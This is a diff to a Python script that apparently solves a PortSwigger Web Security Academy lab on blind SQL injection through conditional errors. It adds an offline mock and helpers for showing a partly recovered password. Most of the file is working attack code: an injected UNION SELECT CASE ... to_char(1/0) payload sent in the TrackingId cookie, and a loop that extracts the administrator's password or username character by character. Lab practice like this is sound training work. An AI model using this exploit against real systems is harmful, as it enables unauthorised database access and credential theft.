@@ -1,5 +1,10 @@
+import sys
 import string
+import time
+from collections import defaultdict
+
 import requests
+
 import backoff
 
 """ Exploiting blind SQL injection by triggering conditional errors
@@ -35,17 +40,19 @@ url = "https://ac881f5a1f0f744480027588006700f4.web-security-academy.net/"
 def bruteforce_password(candidates):
     """getting the password, one character at a time"""
 
-    password = ""
+    password = defaultdict(lambda: "?")
+
     pos = 0
-    while True:
+    max_pos = sys.maxsize
+    while pos < max_pos:
         pos += 1
-        character = bruteforce_password_character(candidates, pos)
+        character = bruteforce_password_character_offline(candidates, pos)
 
         if type(character) == str:
-            password += character
-            print(password)
+            password[pos - 1] = character
+            print(show_incomplete_password(password))
         else:
-            break
+            max_pos = pos
 
     return password
 
@@ -59,7 +66,21 @@ def bruteforce_password_character(candidates, pos):
         return False
 
 
-def try_candidate_on_backoff(_details):
+def bruteforce_password_character_offline(_candidates, pos):
+    time.sleep(0.3)
+    try:
+        return "administrator"[pos - 1]
+    except IndexError:
+        return False
+
+
+def try_candidate(pos, candidate):
+    payload = f"xyz' union select case when (SUBSTR((select username from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
+    # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
+    return exploit(payload)
+
+
+def exploit_on_backoff(_details):
     print("/", end="")
 
 
@@ -67,12 +88,9 @@ def try_candidate_on_backoff(_details):
     backoff.expo,
     requests.exceptions.RequestException,
     max_tries=8,
-    on_backoff=try_candidate_on_backoff,
+    on_backoff=exploit_on_backoff,
 )
-def try_candidate(pos, candidate):
-    payload = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), {pos}, 1) = '{candidate}') then to_char(1/0) else null end from dual -- "
-    # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")
-
+def exploit(payload):
     cookies = {"session": "whatever", "TrackingId": payload}
 
     with requests.get(url, cookies=cookies, timeout=3) as res:
@@ -84,6 +102,14 @@ def try_candidate(pos, candidate):
             return False
 
         return True
+
+
+def show_incomplete_password(password: defaultdict):
+    ret = ""
+    for char in range(max(password.keys()) + 1):
+        ret += password[char]
+
+    return ret
 
 
 def get_candidates_alphanumeric():
